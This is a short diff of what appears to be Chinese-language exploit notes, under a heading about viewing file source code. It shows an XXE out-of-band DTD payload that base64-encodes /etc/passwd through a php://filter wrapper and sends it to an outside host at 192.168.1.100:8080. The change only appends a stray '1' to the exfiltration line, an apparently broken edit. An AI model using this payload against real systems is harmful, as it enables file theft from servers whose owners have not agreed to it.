@@ -212,7 +212,7 @@ EXP查看文件源码
 
 ```dtd
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % send SYSTEM "http://192.168.1.100:8080/?data=%file;">
+<!ENTITY % send SYSTEM "http://192.168.1.100:8080/?data=%file;">1
 %send;
 ```
 
